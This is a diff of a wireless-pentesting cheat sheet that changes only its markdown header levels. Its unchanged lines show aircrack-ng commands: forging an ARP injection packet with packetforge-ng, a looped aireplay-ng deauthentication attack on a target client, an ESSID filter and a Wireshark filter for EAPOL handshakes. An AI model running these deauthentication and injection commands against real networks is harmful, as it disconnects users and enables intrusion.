@@ -197,27 +197,27 @@ Generate packets for injection from PRGA capture.
 packetforge-ng -0 -a ap_mac -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w arp-request
 ```
 
-### Quick & Useful
+## Quick & Useful
 
-#### Loops
+### Loops
 Loop deauthentication attack to target client.
 ```bash
 for s in `seq 1 1000`; do sleep 1 && aireplay-ng -0 1 -e ap_name -a ap_mac -c # wlan0mon; done
 ```
 
-#### Regex
+### Regex
 Filter target ESSID's.
 ```bash
 airodump-ng wlan0mon --essid-regex "^(ap_name).*$"
 ```
 
-#### Force Channel
+### Force Channel
 Force wireless interface to a specific channel. Good for injection card.
 ```bash
 $ ifconfig wlan1mon 6
 ```
 
-#### Renaming interface (temporary)
+### Renaming interface (temporary)
 Rename target interface to `wlan1` instead of systemd generated name.
 ```bash
 $ iwconfig | grep wlx
@@ -228,7 +228,7 @@ $ ip link set wlan1 up
 $ systemctl restart network-manager.service
 ```
 
-#### Wireshark & tshark
+### Wireshark & tshark
 Using Wireshark to filter target packets.
 ```bash
 wlan.addr == target_mac && wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol
